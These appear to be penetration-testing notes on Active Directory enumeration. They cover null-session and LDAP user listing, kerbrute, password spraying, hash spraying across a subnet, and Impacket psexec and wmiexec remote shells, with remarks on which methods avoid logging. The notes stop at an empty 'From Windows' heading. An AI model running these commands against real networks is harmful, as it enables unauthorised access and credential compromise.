# Enumeration

## Uncredentialed Enumeration

Once you are in the network and have enumerated live hosts using nmap, tcpdump or whatever tool.
We need to find a way to establish foothold in domain by gettng username and credentials (clear text or NTLM hash).
It is important to get this access in the early stages of pentest so we can perform more enumeration and attacks.

Note: It’s possible to do this using the SYSTEM account because it can impersonate the computer.
A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). 


### LLMNR Poisoning

We can go for attacks like [LLMNR Poisoning](llmnr-poisoning.md)


### Users Enumeration

- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, 
such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

 ```shell
 # using enum4linux
 enum4linux -U $DC_IP  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

 # using rpcclient
 rpcclient -U "" -N $DC_IP
 rpcclient $> enumdomusers

 # using crackmapexec
 crackmapexec smb $DC_IP --users
 ```

- LDAP Anonymous Bind allow unauthenticated attackers to retrieve information from the domain, such as a complete
 listing of users, groups, computers, user account attributes, and the domain password policy.

 ```shell
 # using ldapsearch, we need to provide proper filter for getting usernames
 ldapsearch -h $DC_IP -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

 # using windapsearch, it is easier as we dont need filter
 windapsearch.py --dc-ip $DC_IP -u "" -U
 ```

- Do some OSINT and try to get information related to people of the target company.
- You can use `linkedin2username` to create a possible worlist of users.

 ```shell
 linkedin2username.py -c company_name -n $DOMAIN -g -o linked_in_users.txt
 ```
- kerbrute is a stealthy option for domain account enumeration.
- It uses kerberos protocol to check if the username is valid or not.
- It takes advantage of kerberos pre-authentication, as the failures will not trigger logs or alerts.
 like Windows event ID 4625: An account failed to log on and event ID 4768: A Kerberos authentication
 ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy.
- If we are successful with this, we should mention it in report

 ```shell
 kerbrute userenum -d $DOMAIN --dc $DC_IP wordlist.txt -o valid_ad_users

 # The tool sends TGT requests to the domain controller without Kerberos 
 # Pre-Authentication to perform username enumeration. If the KDC responds 
 # with the error PRINCIPAL UNKNOWN, the username is invalid.
 ```

Note: crackmapexec will provide you bad password count and time the latest bad attempt occured. This 
will help you in knowing which accounts are close to lockdown and you should avoid attacking them.
This count is maintained separate on each DC in case of multiple DCs.


### Getting Domain Password Policy

- Be careful not to lock accounts while spraying.
- Try to get domain password policy and prepare password list accordingly.
- We can get password policy from `SMB NULL Session` or `LDAP Anonymous Bind`.
- SMB NULL Session from Linux:

 ```shell
 # using rpc client
 rpcclient -U "" -N $DC_IP
 rpcclient $> getdompwinfo

 # using enum4linux
 enum4linux -P $DC_IP

 # using enum4linux-ng (better choice)
 enum4linux-ng -P $DC_IP -oA domain_info
 ```

- SMB NULL Session from Windows:

 ```shell
 net use \\DC01\ipc$ "" /u:""

 # you can use it to check users and passwords
 net use \\DC01\ipc$ "" /u:username
 net use \\DC01\ipc$ "password" /u:username
 ```

- LDAP Anonymous Bind from Linux:

 ```shell
 ldapsearch -h $DC_IP -x -b "DC=<$DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ```

- LDAP Anonymous Bind from Windows:

 ```shell
 # built in tool
 net accounts

 # using powerview
 import-module .\PowerView.ps1
 Get-DomainPolicy

 # You can also use crackmapexec
 ```

- If you have tried other methods and dont have foothold, you may ask the client to
provide password policy.


## Password Spraying

- Once we have enumerated usernames, password policy and prepared wordlists accordingly, we can start
spraying passwords.

- For Linux:

 ```shell
 # using rpc client
 for u in $(cat $USERNAMES_LIST);do rpcclient -U "$u%$Password" -c "getusername;quit" $DC_IP | grep Authority; done

 # using kerbrute
 kerbrute passwordspray -d $DOMAIN --dc $DC_IP valid_users.txt  $PASSWORD
 
 # using crackmapexec
 crackmapexec smb $DC_IP -u valid_users.txt -p $PASSWORD | grep +
 ```

- If you get some hits, you can validate them:

 ```shell
 crackmapexec smb $DC_IP -u username -p password
 ```

- For Windows:
 ```shell
 # DomainPasswordSpray is a cool tool. If you run it when you are authenticated to domain
 # it will retrieve password policy, valid users and exclude accounts within 1 attempt of locking out
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password $PASSWORD -OutFile spray_success -ErrorAction SilentlyContinue
 ```

- Always look for patterns in password, try password reuse etc.
- Internal password spraying is possible from domain user account as well as local admin if you have creds, NTLM hash.
- If you have hash of local admin on a machine, you can spray it on entire subnet to check if it is valid on other machines as well.

 ```shell
 crackmapexec smb --local-auth $IP/23 -u administrator -H $HASH | grep +
 ```

### Other Targets
- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication

## Security Controls Enumeration

- Once we get foothold in domain, it is important to enumerate security controls.
- As some security controls may effect our tools. We may need to work at 
"living off the land" by using tools that exist natively on the hosts.

 ```shell
 # Windows Defender, if RealTimeProtectionEnabled=True means
 # defender is active
 Get-MpComputerStatus

 # AppLocker
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

 # PowerShell Constrained Language Mode, if output is ConstrainedLanguage
 $ExecutionContext.SessionState.LanguageMode

 # Local Administrator Password Solution (LAPS)
 # LAPSToolkit greatly facilitates this with several functions.
 Find-LAPSDelegatedGroups
 # The Find-AdmPwdExtendedRights checks the rights on each computer
 # with LAPS enabled for any groups with read access and users with "All Extended Rights." 
 Find-AdmPwdExtendedRights
 # We can use the Get-LAPSComputers function to search for computers that have LAPS enabled,
 # when passwords expire, and even the randomized passwords in cleartext if our user has access.
 Get-LAPSComputers
 ```

## Credentialed Enumeration

For credentialed enumeration, we must have a user's cleartext password, NTLM 
password hash, or SYSTEM access on a domain-joined host.

Once we have any of the above, we should start enumerating domain. We are 
interested in domain users and computers attributes, group membership,
Group Policy Objects, permissions, ACLs, trusts and more

### From Linux:

- Enumeration using `crackmapexec` and `smbmap`:

 ```shell
 # getting password policy
 crackmapexec smb $DC_IP -u username -p password --pass-pol

 # getting usernames
 crackmapexec smb $DC_IP -u username -p password --users

 # getting groups
 crackmapexec smb $DC_IP -u username -p password --groups

 # getting loggin in users on a machine
 crackmapexec smb $MACHINE_IP -u username -p password --loggedon-users

 # getting shares info
 crackmapexec smb $MACHINE_IP -u username -p password --shares
 # getting list of readable files on a share
 # results at /tmp/cme_spider_plus/<ip of host>
 crackmapexec smb $MACHINE_IP -u username -p password -M spider_plus --share $SHARE_NAME

 # getting shares info using SMBMap
 smbmap -u username -p password -d $DOMAIN -H $MACHINE_IP
 # Recursive list of all directories
 smbmap -u username -p password -d $DOMAIN -H $MACHINE_IP -R $SHARE_NAME --dir-only
 ```

- Enumeration using `rpcclient`:

Note: 
- A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format)
 utilized by Windows to track and identify objects.
- When an object is created within a domain, SID will be combined with a RID (RID at end) 
to make a unique value used to represent the object.
- RID is unique for object only within its domain.
- The built-in Administrator account will always have the RID value Hex 0x1f4, or 500.

 ```shell
 # staring a session. you can also try getting NULL session
 rpcclient -U "$u%$Password" $DC_IP

 # getting users and their RIDs
 rpcclient $> enumdomusers

 # getting user info using RID
 rpcclient $> queryuser 0x457
 ```

- Enumeration using Impacket Toolkit

 ```shell
 # psexec creates a remote service by uploading an executable to the ADMIN$ share
 # on the target. It then registers the service via RPC and the Windows Service Control
 # Manager. Once established, communication happens over a named pipe, providing shell
 # as SYSTEM (if you have local admin privs).
 psexec.py $DOMAIN/username:'password'@$DC_IP

 # Wmiexec.py utilizes Windows Management Instrumentation and provides semi-interactive
 # shell. It is stealthy (preferred). Each command will execute a new cmd.exe from WMI
 # event ID 4688: A new process has been created, may catch it
 # runs in the context of user
 wmiexec.py $DOMAIN/username:'password'@$DC_IP
 ```

- Automating search using `Windapsearch ` and `Bloodhound`:

 ```shell
 # getting domain admins
 python3 windapsearch.py --dc-ip $DC_IP -u username@$DOMAIN -p password --da
 # getting privileged users
 python3 windapsearch.py --dc-ip $DC_IP -u username@$DOMAIN -p password -PU

 # gathering domaion information using BloodHound and upload to UI
 bloodhound-python -u 'username' -p 'password' -ns $DC_IP -d $DOMAIN -c all --zip domain.zip

 ```

- A handy cheatsheet: https://wadcoms.github.io/


### From Windows:
